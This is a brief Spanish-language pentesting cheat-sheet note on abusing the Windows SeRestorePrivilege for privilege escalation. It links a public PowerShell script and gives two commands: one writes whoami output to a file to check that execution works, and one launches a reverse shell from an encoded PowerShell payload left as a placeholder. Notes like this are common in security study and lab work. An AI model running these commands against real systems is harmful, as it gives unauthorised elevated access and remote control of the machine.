---
tags: [privesc, windows, serestore]
---

# SeRestorePrivilege

Si aparece inhabilitado → cargar el PS1 para habilitarlo.

Script: https://github.com/0x4D-5A/Invoke-SeRestoreAbuse/blob/main/Invoke-SeRestoreAbuse.ps1

```powershell
# Verificar comando (escribir a C:\foo.txt)
Invoke-SeRestoreAbuse -Command 'cmd /c powershell -c "whoami > C:\foo.txt"'

# Reverse shell
Invoke-SeRestoreAbuse -Command 'cmd /c powershell -e <base64>'
```

